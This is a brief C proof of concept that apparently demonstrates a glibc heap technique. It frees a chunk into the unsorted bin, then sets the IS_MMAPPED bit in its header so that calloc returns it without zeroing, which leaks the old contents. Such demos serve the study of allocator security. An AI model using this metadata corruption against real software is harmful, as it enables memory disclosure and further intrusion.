#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *m, *victim;
	malloc_chunk *c;

	m = malloc(0x418);
	malloc(0);
	c = mem2chunk(m);
	m[4] = 0xdeadbeef;
	printf("m         = %p\nm[4]      = %#lx\n\n", m, m[4]);

	free(m);			// to unsortedbin

	puts("Exploit!");
	c->size |= 2;			// vuln

	victim = calloc(1, 0x418);	// from unsortedbin
	printf("victim    = %p\nvictim[4] = %#lx\n"
		, victim, victim[4]);
}
